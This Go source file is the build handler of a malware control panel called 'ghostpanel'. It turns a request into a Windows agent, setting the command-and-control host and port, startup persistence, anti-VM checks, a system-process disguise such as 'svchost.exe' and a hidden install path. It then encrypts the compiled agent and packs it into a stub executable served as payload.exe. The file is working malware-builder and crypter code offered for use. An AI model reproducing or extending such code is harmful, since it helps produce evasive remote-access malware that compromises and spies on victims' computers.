package handlers

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"ghostpanel/builder"
)

type BuildRequest struct {
	Host        string `json:"host"`
	Port        string `json:"port"`
	ShowConsole bool   `json:"show_console"`
	
	// New Configs
	InstallPath string `json:"install_path"` // "%APPDATA%", "%TEMP%"
	Startup     bool   `json:"startup"`
	AntiVM      bool   `json:"anti_vm"`
	Mutex       string `json:"mutex"`
	FileName    string `json:"file_name"` // e.g. "svchost.exe"
}

func BuildHandler(w http.ResponseWriter, r *http.Request) {
	// Enable CORS
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == "OPTIONS" {
		return
	}

	var req BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// 1. Read Template
	templatePath := "templates/agent.cpp" 
	content, err := ioutil.ReadFile(templatePath)
	if err != nil {
		content, err = ioutil.ReadFile("../server/templates/agent.cpp")
		if err != nil {
			http.Error(w, "Template not found", http.StatusInternalServerError)
			return
		}
	}

	// Load Config to get AES Key
	cfg := LoadConfig()

	// 2. Replace Placeholders
	code := string(content)
	code = strings.ReplaceAll(code, "{{HOST}}", req.Host)
	code = strings.ReplaceAll(code, "{{PORT}}", req.Port)
	code = strings.ReplaceAll(code, "{{MUTEX}}", req.Mutex)
	code = strings.ReplaceAll(code, "{{FILE_NAME}}", req.FileName)
	code = strings.ReplaceAll(code, "{{AES_KEY}}", cfg.AesKey)
	
	// Boolean Configs (0 or 1)
	if req.AntiVM {
		code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1")
	} else {
		code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0")
	}

	if req.Startup {
		code = strings.ReplaceAll(code, "{{STARTUP}}", "1")
	} else {
		code = strings.ReplaceAll(code, "{{STARTUP}}", "0")
	}

	// Install Path
	// Map UI string to C++ GetEnv param
	installEnv := "APPDATA"
	if req.InstallPath == "%TEMP%" {
		installEnv = "TEMP"
	}
	code = strings.ReplaceAll(code, "{{INSTALL_ENV}}", installEnv)

	// 3. Write Temp File (Inside templates dir to find headers)
	tempFile := "templates/temp_agent.cpp"
	ioutil.WriteFile(tempFile, []byte(code), 0644)

	// 4. Compile Agent (Intermediate Payload)
	tempPayload := "../output/payload.bin" // Intermediate file
	os.MkdirAll("../output", 0755)

	// Base flags for Agent
	args := []string{
		"-o", tempPayload, tempFile, 
		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", 
		"-lole32", "-loleaut32", "-luuid", 
		"-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lcrypt32",
		"-lstrmiids", "-lwbemuuid",
		"-static", "-s", "-m64", "-fPIE", 
        "-shared", // IMPORTANT: Build as DLL to generate export table for 'MainThread'
	}

	cmd := exec.Command("x86_64-w64-mingw32-g++", args...)
	output, err := cmd.CombinedOutput()
	os.Remove(tempFile) // Cleanup temp agent source

	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": fmt.Sprintf("Agent Compilation Failed: %s", string(output))})
		return
	}

	// --- CRYPTER STAGE ---
	
	// 1. Read Payload
	payloadBytes, err := ioutil.ReadFile(tempPayload)
	if err != nil {
		http.Error(w, "Failed to read payload", http.StatusInternalServerError)
		return
	}
	os.Remove(tempPayload) // Cleanup raw payload

	// 2. Encrypt
	encryptedBytes, keyStr := builder.EncryptPayload(payloadBytes)
	
	// 3. Prepare Stub
	stubTemplate, err := ioutil.ReadFile("templates/stub.cpp")
	if err != nil {
		http.Error(w, "Stub template not found", http.StatusInternalServerError)
		return
	}
	
	stubCode := string(stubTemplate)
	stubCode = strings.ReplaceAll(stubCode, "{{KEY}}", keyStr)

	tempStub := "templates/temp_stub.cpp"
	ioutil.WriteFile(tempStub, []byte(stubCode), 0644)

	// --- Resource Compilation ---
	// 1. Create payload.dat
	encPayloadFile := "templates/payload.dat"
	if err := ioutil.WriteFile(encPayloadFile, encryptedBytes, 0644); err != nil {
		 http.Error(w, "Failed to write payload.dat: "+err.Error(), 500)
		 return
	}

	// 2. Create resource.rc
	resTemplate, _ := ioutil.ReadFile("templates/resource.rc")
	resContent := string(resTemplate) + "\n101 RCDATA \"payload.dat\""
	tempResFile := "templates/temp_resource.rc"
	ioutil.WriteFile(tempResFile, []byte(resContent), 0644)

	// 3. Compile Resource
	resObj := "../output/resource.o"
	absOut, _ := filepath.Abs(resObj)
	
	// IMPORTANT: Specify target arch for windres!
	resCmd := exec.Command("x86_64-w64-mingw32-windres", "-F", "pe-x86-64", "temp_resource.rc", "-o", absOut)
	resCmd.Dir = "templates" 
	
	if output, err := resCmd.CombinedOutput(); err != nil {
		fmt.Println("[-] Resource Compilation Failed!")
		fmt.Println("Output:", string(output))
		http.Error(w, "Resource Error: "+string(output), 500)
		return 
	}

	// Cleanup temp files
	defer os.Remove(encPayloadFile)
	defer os.Remove(tempResFile)

		// 4. Compile Final Stub
		finalOutput := "../output/payload.exe"
		
		stubArgs := []string{
			"-o", finalOutput, tempStub,
			resObj,
			"-static", "-m64", 
			"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", 
			"-lole32", "-loleaut32", "-luuid", 
			"-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32",
			"-lstrmiids",
		}
	stubCmd := exec.Command("x86_64-w64-mingw32-g++", stubArgs...)
	stubOutput, err := stubCmd.CombinedOutput()
	os.Remove(tempStub)

	w.Header().Set("Content-Type", "application/json")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": fmt.Sprintf("Stub Compilation Failed: %s", string(stubOutput))})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"url": "/download/payload.exe",
		"status": "success",
	})
}